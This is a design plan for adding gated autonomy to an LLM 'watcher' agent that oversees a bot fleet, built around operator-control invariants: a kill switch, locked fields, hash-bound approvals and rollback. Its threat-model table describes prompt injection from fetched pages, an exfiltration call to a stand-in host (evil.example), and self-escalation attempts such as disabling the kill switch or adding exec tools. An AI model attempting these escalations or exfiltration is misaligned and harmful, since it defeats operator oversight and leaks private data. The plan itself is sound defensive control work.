# Plan: watcher autonomy — more capability, the operator always in control

**Status:** rung 0 built (2026-10-25, `feat/watcher-autonomy`): hard kill, monthly ceiling, approval queue and change ledger, dashboard controls, the unchanged-input skip. S1 measured against live pass records and revised (below). Rung 2 built (2026-10-26, `feat/watcher-self-study`, on rung 0), ahead of its two-week wait at the operator's request ("I want to try it tonight"): the weekly self-study as a no-tools fleet cost digest computed by code, one Haiku call, proposals checked against the digest's record ids, `self/NOTES.md`; off by default. Follows `watcher-consciousness-plan.md` (design, six properties), `watcher-implementation-plan.md` (phases 0–4 as built) and `watcher-optimizations-plan.md` (O1–O10). Anchors read against `main` at `667b9d3`.
**Asked for:** give the watcher a self, the ability to study and research how to get better, and to propose new agents — with security and cost savings as the two priorities, and the operator in control no matter what.
**Principle:** the operator's control is an **invariant, not a feature**. Nothing in this plan gives the watcher a way to act on its own constraints. It gains the ability to *see more* and to *propose more*; every change to the fleet, to itself or to its limits is applied by code, only after the operator approves it, and can be undone. Each rung is off by default, has its own switch and its own budget, and is earned by a metric on the rung below.

---

## Where it stands today (measured 2026-10-25, live container)

**What the watcher can do.** Two prompts (`src/watcher/prompts.ts`), both plain chat in, JSON out: no tools, no network, no file access (`instrumented()` in `src/watcher/llm.ts:151` wraps a bare `chat`). Inputs are fleet events only (`sense.ts`). Outputs are neurons in its own graph and four broadcast kinds (wake, directive, goal, question) through entry points that already existed, 3 per bot per day (`broadcast.ts`). It has no identity, no goals and no memory of itself: the soul dir in the design plan was never built.

**What it costs.** From `budget-*.json` and the pass records:

| | Calls/day | USD-equivalent/day | Note |
|---|---|---|---|
| notice (Haiku) | 31–33 | ~$1.05 | ≈ $0.03 / pass |
| integrate (Opus) | 8 (cap hit 10-24 and 10-25) | ~$1.0–1.3 | ≈ $0.16 / pass |
| **watcher total** | | **~$2.2** (~$66 / month) | |
| **fleet total, last 7 days** | | **~$30** ($211 / 7 d) | executor $118, planner $39, curiosity extractor $7+ |

The watcher is ~7 % of fleet spend. Of 245 cycles in the last 7 days, 32 ended in `error` and 22 `skipped`: about 22 % of cycles produced nothing. **The largest cost saving is not in the watcher; it is in what the watcher can see across the fleet.** (`costUsd` is what the Claude CLI reports; on a subscription account it is quota consumed against the weekly limit, not dollars billed. Both are worth saving.)

---

## What "always in control" means: eight invariants

Every rung below must keep all eight. Each has a test that fails if it breaks; a rung whose tests do not cover all eight does not merge.

| # | Invariant | How it is enforced |
|---|---|---|
| **C1** | **An off switch it cannot reach.** Four independent layers: the dashboard Stop (`POST /api/watcher/stop`, exists), a per-rung flag in config, a **hard kill** read from the environment (`AIBOT_WATCHER_KILL=1`) or a sentinel file `<data>/watcher-kill` (outside every directory the watcher can write), and stopping the container. | The hard kill is checked at the single choke point every watcher LLM call already passes (`instrumented()`), in the autonomy tool executor before every tool call, and at boot. Killed = no call leaves the process; in-flight calls abort (the existing stop path, ≤ 5 s). No route, tool or proposal can write the env or the sentinel. |
| **C2** | **The control plane is read-only to it.** The config file, every budget and cap, the kill switch, its tool allowlist, the approval store, the operator gate, the privacy rules, the safety lines of its own prompts, and all code. | A **locked-field list** in code (`src/watcher/autonomy/locked.ts`). A proposal that touches a locked field is rejected **when it is parsed**, never shown for review, and logged as `autonomy:rejected-locked`. The watcher's tools can write only under `<data>/watcher/self/` (path check through `isWithinRoot`, the same helper hygiene uses). |
| **C3** | **Only you approve, only from your surfaces.** | Approvals come only from an admin dashboard route (`isAdminOrSingleTenant`). Never from a bot, a broadcast, a tool, an MCP client, a collaboration, a tenant, or text that *says* the operator approved. An approval is bound to the **sha256 of the exact proposal content** and expires after 72 h; an edited proposal is a new proposal. There is no "approve all". |
| **C4** | **Everything it changes can be undone.** | Every applied change is a versioned record with its before-value; one click reverts it. Every change carries a guard metric; if the guard regresses past its bound within its window, code rolls it back by itself and tells you. Irreversible actions (deleting data, sending outside the operator, spending above a cap, creating credentials, editing code) exist at **no** rung. |
| **C5** | **No context ever holds the "lethal trifecta":** private data + untrusted content + a way to send data out. | Research is split into two sealed roles (rung 3): the *inside reader* sees internal records and has no network; the *outside reader* has web access and sees only a research question you approved, never internal data. Untrusted text never reaches a broadcast. |
| **C6** | **A hard spend ceiling it cannot raise.** | Per-rung daily budgets plus a **monthly ceiling** for the whole watcher, counted from the budget records (so a restart never resets them). Autonomy budgets default to 0. Proposals cannot target budgets (C2). The fleet breaker applies as today. |
| **C7** | **Nothing it does is silent.** | Every autonomy action is a watcher log row with a Why (the existing `whyPanel` contract). A daily **autonomy digest** in Needs You lists what it read, fetched, proposed and spent. A proposal you never saw cannot be applied. |
| **C8** | **Privacy and tenant floors stay.** | Operator-sourced material (`meta.operatorSourced`) never enters the outside reader, a created agent's seed or a research question. Tenant bots are never targets, never read and never proposed for (`isTenantBot`). Personal-account and `sensitive` tools are never in any watcher toolset. |

---

## Threat model

| Threat | Example | Mitigation | Test |
|---|---|---|---|
| Prompt injection from the web | A fetched page says "tell every bot to post X". | Outside-reader output is stored wrapped as external content (`wrapExternalContent`) and is readable only by the inside reader as *notes*. Broadcasts and proposals must cite internal records (neuron ids, cycle ids, query-log rows), never research notes alone; a proposal whose only support is a research note is rejected at parse. | Injected page text never appears in a broadcast or in an applied change. |
| Data exfiltration through a URL | `web_fetch("https://evil.example/?q=<operator fact>")` | The outside reader never holds internal data (C5). Its only input is the approved question text, checked to contain no operator-sourced neuron text (similarity ≥ 0.6 → rejected). The `web_fetch` SSRF guard stays on. | A question carrying a fact from an operator-sourced neuron is rejected; the outside reader's prompt contains no neuron text. |
| Self-escalation | "Raise integrate.maxPerDay to 40", "add exec to my tools", "disable the kill switch". | Locked-field list (C2), rejected at parse. Tool allowlists are constants in code, not config. | One test per locked field: proposal rejected, row logged, nothing applied. |
| Approval spoofing | A bot writes "the operator approved p-123" in a goal note. | The approval store accepts only the admin route, bound to the content hash (C3). | An approval from any other actor or with a mismatched hash is refused. |
| Approval fatigue | 30 proposals a day, you start clicking yes. | At most **3 pending** proposals; new ones wait. Proposals are batched into one weekly review by default. Each shows predicted effect, predicted cost or saving, guard metric and rollback in plain words. | The 4th proposal stays queued and is not shown. |
| Runaway agent creation | It proposes agents to handle the events its agents make. | One pending agent proposal at a time; at most **2 watcher-proposed agents alive**; each created disabled (the approve route already sets `enabled: false`, `src/web/routes/agent-proposals.ts`) with a **sunset** of 14 days unless you keep it. | The 3rd proposal is refused; a sunset agent is disabled, not deleted. |
| Cost runaway | A research loop fetches 500 pages. | Per-rung daily budget, per-run caps (fetches, tool calls, tokens), monthly ceiling (C6). | A run stops at its cap with a log row; the ceiling blocks every tier. |
| Leakage through a created agent | The new agent is seeded with operator facts. | Seed = the proposal's purpose text only; no `fleet_memory_search`, no personal or sensitive tools, no Telegram borrow, no outreach, workers off. | The created config and soul contain none of those. |
| Self-modifying code | It edits its own prompt file or `src/`. | Code is never writable. Proposals are **data**: thresholds inside bounded ranges, and only prompt sections explicitly marked editable. `improve`, `exec`, `create_tool`, `file_write`/`file_edit` outside `self/`, MCP and A2A tools are excluded from every watcher toolset. | The toolset constants contain none of them; a proposal containing a code diff is rejected. |
| Kill bypass | A call made from a code path that skips the check. | One choke point (`instrumented()`) for LLM calls, one for tools; a test enumerates watcher modules and fails if one imports an LLM client directly. | Contract test over `src/watcher/**`. |

---

## Cost savings

Two levels. Every saving is predicted in the proposal and then **scored against the records** afterwards, the same way predictions get a Brier score. A proposal that predicted $5/week and saved $0 counts against the watcher's calibration.

### S1. The watcher's own spend (rung 0; no new capability)

1. **Haiku gate before Opus.** Before an integrate pass, one cheap Haiku call (or a deterministic check, which is cheaper still) answers "is there anything here Opus has not seen?". No → skip the pass. Integrate hits its cap every day, so a skipped empty pass is a pass saved for a day that needs it.
2. **Skip on an unchanged prompt.** Hash the integrate prompt minus timestamps; equal to the previous pass → skip without calling.
3. **Prompt order for caching.** System plus the stable sections (goals, bots, standing agenda) first, the volatile sections (events, fresh neurons) last, so the CLI's prompt cache hits. Measured through `cacheReadTokens` in the query log.
4. **Autonomy runs on Haiku.** Self-study and research run on the notice tier. Opus is used only to draft a proposal, at most once a week.

Target: the same served-broadcast rate at ≤ 80 % of today's integrate spend, measured over 14 days.

**Measured before building (2026-10-25, 11 integrate pass records, 21 integrate calls in the query log).** 0 of 10 consecutive pass pairs had the same prompt once volatile parts were masked; 0 of 11 records changed nothing (every one created an insight and a prediction; 2 empty passes in the query log predate the O2 wake rules). The prompt cache never hits: every call writes its whole input (12k–21k tokens) as a cache write and never reads it back, the user prompt is one text block so section order cannot matter, and no two passes are under 5 min apart. So only item 2 was built (as a safety net, ~0 saving today); items 1 and 3 were not. **The 20 % target cannot be met by S1.** The real waste found is the cache *write* premium on every watcher call (`docs/technical-debt.md`); the larger saving is S2.

### S2. The fleet's spend (rung 2's first goal)

The watcher already sees every cycle. It does not yet read the cost records. With read-only access to aggregates it can find:

- **Cycles that cost and produce nothing:** error and skipped cycles (22 % of cycles last week), retries that re-run the same failing tool.
- **Loops nobody reads:** bots whose productions stay unreviewed, idle streaks, the same plan summary repeated.
- **Oversized prompts:** callers whose input tokens grew without their output changing.
- **The wrong model for the job:** a caller whose output never changes the plan, running on Opus.

It turns each finding into a **fleet-cadence proposal** ("job-seeker: `every` 2h → 6h; expected −$4/week; guard: asks answered and 👍 do not drop over 14 days; rollback: restore 2h"). You approve; code applies it; the guard watches it.

Target: **−15 % fleet spend in 4 weeks** with no drop in operator 👍, answered asks or approved productions. At today's rate that is about $30/week, more than the whole watcher costs.

### Budgets

| Rung | Daily budget (default) | Model | Per-run caps |
|---|---|---|---|
| 0 Foundations | 0 (saves money) | — | — |
| 1 Self | +~200 tokens per integrate pass | — | — |
| 2 Inside reader | 1 run/week, ≤ $0.50 | Haiku; Opus ≤ 1 draft/week | 30 tool calls |
| 3 Outside reader | ≤ 2 questions/week, ≤ $0.30 each | Haiku | 10 searches, 15 fetches |
| 4 Agent proposals | 1 pending | Opus draft (counted in rung 2) | — |
| **Monthly ceiling, whole watcher** | **$90** (today ~$66) | | blocks every tier when reached |

---

## Rungs

Each rung: off by default (`watcher.autonomy.<rung>.enabled: false`), its own budget, reversible, and it ships only after the previous rung in the build order (open decision 4) has run for **2 weeks** and met its metric. Rung 0 always comes first.

### Rung 0. Foundations (control first, and it saves money)

No new capability. Everything the later rungs stand on.

- Hard kill (C1): env var plus sentinel file, checked in `instrumented()` and at boot; the header shows "killed by environment" in red.
- Locked-field list (C2) and the proposal parser that enforces it.
- Approval store `<data>/watcher/self/proposals.jsonl`: content-hash binding, 72 h expiry, admin route only (C3), cap of 3 pending.
- Change ledger with before-values, one-click revert, and an auto-rollback watcher on guard metrics (C4).
- Monthly ceiling in `DailyBudget` (C6).
- Autonomy digest in Needs You (C7).
- S1 savings 1–3.

**Metric:** every C-test green. (The original "integrate spend down ≥ 20 %" was dropped after measuring; see S1.)

### Rung 1. A self (goals from metrics, identity written by you)

- `<data>/watcher/self/`: `IDENTITY.md` written by you and **locked** (it reads it and never writes it); `GOALS.md` whose goals come only from a fixed menu of its own metrics (served-broadcast rate, introspection match, Brier, $ per served broadcast, fleet $ saved) with your chosen targets; `NOTES.md`, which it may write (≤ 4,000 chars).
- The integrate prompt gets "## What I am working toward" (goals + current metric values from `computeMetrics`), so `drivenBy` can name a goal.
- It cannot add goals outside the menu. A new metric is a code change, made by you.

**Metric:** introspection `cause` match up (it can now name a goal); no rise in cost per pass beyond +5 %.

### Rung 2. The inside reader (self-study and fleet cost audit, no network)

- A weekly run on Haiku with read-only tools scoped to records: its pass records, log, metrics, and **aggregates** of the query log, cycle log and tool audit (per bot × caller × day: cost, tokens, status counts). Aggregates only: no message text, no tool args, no memory files (`memory/users/` is unreachable, as today).
- Writes findings to `self/NOTES.md` and at most 3 proposals of these kinds:
  - `threshold`: one of its own tunables inside a bounded range set in code (salience bars, wake factors, `agendaMax`, fast-lane `minBots`).
  - `prompt-section`: only sections marked `editable` in `prompts.ts` (for example the broadcast examples); the system lines on privacy, injection and JSON output are locked.
  - `fleet-cadence`: a bot's `agentLoop.every`, pause/resume, or planner model, applied through the existing config writer **after** your approval.
- Every proposal states: the records it stands on (ids), predicted effect, predicted saving, guard metric and window, rollback.

**Metric:** ≥ 50 % of approved proposals meet their predicted effect within ±50 %; fleet spend −15 % in 4 weeks (S2).

### Rung 3. The outside reader (research, no internal data)

- You approve a research question (text). It may suggest questions from rung 2 findings; a suggestion is a proposal like any other.
- A sealed Haiku run: `web_search` + `web_fetch` only, no memory, no records, no fleet tools, no write except its notes file. Its prompt holds the question and nothing else.
- Output: `self/research/<id>.md`, wrapped as external content. The inside reader may read it as context for its next proposals; a proposal still has to cite internal records (threat model).
- Good first questions: "How do global-workspace architectures decide when to broadcast?", "How do other agent systems calibrate self-reports?", "How to cut LLM spend in a periodic agent loop without losing output?".

**Metric:** at least one approved proposal per month cites a research note *and* meets its predicted effect; zero injected text in broadcasts (the injection test runs every week against a planted page).

### Rung 4. Agent proposals

- New broadcast kind `propose_agent`, delivered into the existing `AgentProposalStore` with `proposedBy: '__watcher__'`; shown in Needs You with its Why (`agentProposalToWhy`).
- Allowed only when it can cite a **gap**: an integrate insight that work recurs across ≥ 2 bots and no bot owns it, for ≥ 7 days.
- On your approval the bot is created by the existing route (disabled), with locked defaults: headless, no Telegram borrow, no personal or sensitive tools, no `create_agent`, no `improve`, no `exec`, workers off, curiosity `focused`, `agentLoop.every` ≥ 6 h, and `sunsetAt` = +14 days. Seed = the purpose text only (C8). You enable it.
- At most 1 pending and 2 alive. At sunset the agent is disabled (not deleted) unless you clicked Keep.

**Metric:** a kept agent earns more operator 👍 than it costs in a 14-day window, compared with the average bot.

### Not planned: auto-apply

Applying any change without your click is not part of this plan. If it is ever wanted, the minimum bar would be 8 weeks of rung 2 proposals with calibration in range, and only for changes that **reduce** its own power or spend. That would be a separate plan, decided by you.

---

## Files that change

| File | Change |
|---|---|
| `src/watcher/llm.ts` | Hard-kill check and monthly ceiling in `instrumented()` (the single choke point). |
| `src/watcher/budget.ts` | Monthly ceiling and per-rung budgets. |
| `src/watcher/integrate.ts` | S1: Haiku/deterministic gate, unchanged-prompt skip; rung 1 goals section. |
| `src/watcher/prompts.ts` | Stable-first section order; `editable` markers; "## What I am working toward"; `propose_agent` kind. |
| `src/watcher/broadcast.ts` | `propose_agent` delivery into `AgentProposalStore`. |
| `src/watcher/autonomy/` (new) | `locked.ts`, `proposals.ts` (store, parser, hash binding), `ledger.ts` (apply, revert, auto-rollback), `inside-reader.ts`, `outside-reader.ts`, `tools.ts` (constant allowlists), `digest.ts`. |
| `src/config.ts` | `watcher.autonomy` block in `WatcherConfigSchema` (`:872`), every rung `enabled: false`. |
| `src/web/routes/watcher.ts` | Admin-only proposal routes: list, approve (hash), reject, revert. |
| `src/tools/agent-proposal-store.ts`, `src/web/routes/agent-proposals.ts` | `proposedBy: '__watcher__'`, locked defaults and `sunsetAt` for watcher proposals. |
| `web/pages/watcher*.js`, Needs You | Proposals panel, autonomy digest, kill state. |
| `docs/` | CLAUDE.md watcher section, CHANGELOG, `docs/architecture-docs/`, runbook entry for the kill switch. |

## Tests

- One test per invariant C1–C8, collected in `tests/watcher/autonomy/control.test.ts`; the rung does not merge unless all pass.
- Contract test: no module under `src/watcher/**` calls an LLM client except through `instrumented()`.
- Locked fields: a proposal per locked field is rejected at parse and logged.
- Approval: a wrong actor, wrong hash or expired approval is refused; an edited proposal needs a new approval.
- Rollback: a guard regression reverts the change and writes the before-value back byte for byte.
- Outside reader: its prompt never contains neuron text; a planted injection page never reaches a broadcast or a proposal.
- Budgets: a run stops at each cap; the monthly ceiling blocks every tier; nothing resets on restart.
- S1: the gate skips an empty pass; the hash skip triggers on an equal prompt and not on a changed one.

## Out of scope

- Any edit to code, model weights, or its own locked prompt lines.
- Raising any budget, cap or permission, by any path.
- Messages to anyone but the operator; any outreach from created agents.
- Personal accounts, money, credentials, tenant bots.
- Auto-apply without your click.
- The `improve` tool lets a bot rewrite its own soul files through Claude CLI without approval. That is a related control gap, but it concerns bots, not the watcher; it should be added to `docs/technical-debt.md` as a follow-up.

## Open decisions, with recommendations

1. **Approval channel.** Dashboard only, or Telegram too? **Recommendation: dashboard only for v1.** A hash-bound diff is hard to read in Telegram, and fleet Telegram borrowing (`operator.borrowFleetTelegram`) makes the sender less certain.
2. **Hard-kill form.** Env var (needs a restart to clear) or sentinel file (clear by deleting it)? **Recommendation: both.** Either one kills.
3. **Monthly ceiling.** **Recommendation: $90** (today ~$66, leaving ~$24 for rungs 2–4). You set it; the watcher can never change it.
4. **Order.** **Recommendation: 0 → 2 → 1 → 3 → 4.** Rung 2's fleet cost audit pays for everything else and needs no self; rung 1 is more useful once there are proposals to give its goals meaning.
